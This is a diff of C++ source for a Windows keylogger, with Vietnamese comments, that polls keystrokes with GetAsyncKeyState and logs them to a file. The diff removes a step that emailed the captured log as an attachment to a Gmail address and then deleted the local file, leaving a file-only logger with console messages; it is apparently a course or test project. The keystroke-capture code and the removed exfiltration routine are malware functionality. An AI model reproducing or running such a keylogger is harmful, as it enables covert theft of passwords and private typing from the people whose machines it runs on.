@@ -3,7 +3,6 @@
 #include <map>
 #include <filesystem>
 #include "lib.h"
-#include "sendEmail.h"
 #include "keylogger.h"
 
 bool isShiftPressed() { return (GetAsyncKeyState(VK_SHIFT) & 0x8000); }
@@ -62,47 +61,20 @@ std::string getCharFromKey(int key) {
   return "[UNK:" + std::to_string(key) + "]";
 }
 
+// Chỉ ghi keylog vào file, không gửi email
 void start_keylogger(const std::string& filename, int durationSeconds) {
+  // Tạo thư mục nếu chưa có
+  std::filesystem::create_directories(
+      std::filesystem::path(filename).parent_path());
+
   std::ofstream log(filename);
   if (!log.is_open()) {
     std::cerr << "Failed to open log file: " << filename << std::endl;
     return;
   }
 
-  auto startTime = std::chrono::steady_clock::now();
-  while (std::chrono::steady_clock::now() - startTime <
-         std::chrono::seconds(durationSeconds)) {
-    for (int key = 8; key <= 255; ++key) {
-      if (GetAsyncKeyState(key) & 0x1) {
-        std::string keyStr = getCharFromKey(key);
-        log << keyStr;
-        log.flush();
-      }
-    }
-    std::this_thread::sleep_for(std::chrono::milliseconds(5));
-  }
-
-  log.close();
-
-  ifstream test_file(filename);
-  if (test_file.good()) {
-    test_file.close();
-    send_email_with_attachment("serverbottestmmt@gmail.com", "Keylogger Log",
-                               "Keylog data from the remote device.", filename);
-  } else {
-    cerr << "Failed to create keylog file" << endl;
-  }
-
-  if (!std::filesystem::remove(filename))
-    cerr << "Failed to delete the file." << endl;
-}
-
-void run_keylogger_and_save(const std::string& outFile, int durationSeconds) {
-  std::ofstream log(outFile);
-  if (!log.is_open()) {
-    std::cerr << "[Server] Failed to open log file: " << outFile << "\n";
-    return;
-  }
+  std::cout << "[Keylogger] Starting keylogger for " << durationSeconds
+            << " seconds, output: " << filename << std::endl;
 
   auto startTime = std::chrono::steady_clock::now();
   while (std::chrono::steady_clock::now() - startTime <
@@ -118,5 +90,6 @@ void run_keylogger_and_save(const std::string& outFile, int durationSeconds) {
   }
 
   log.close();
-  std::cout << "[Server] Keylog saved to " << outFile << "\n";
+  std::cout << "[Keylogger] Keylogger finished, saved to: " << filename
+            << std::endl;
 }
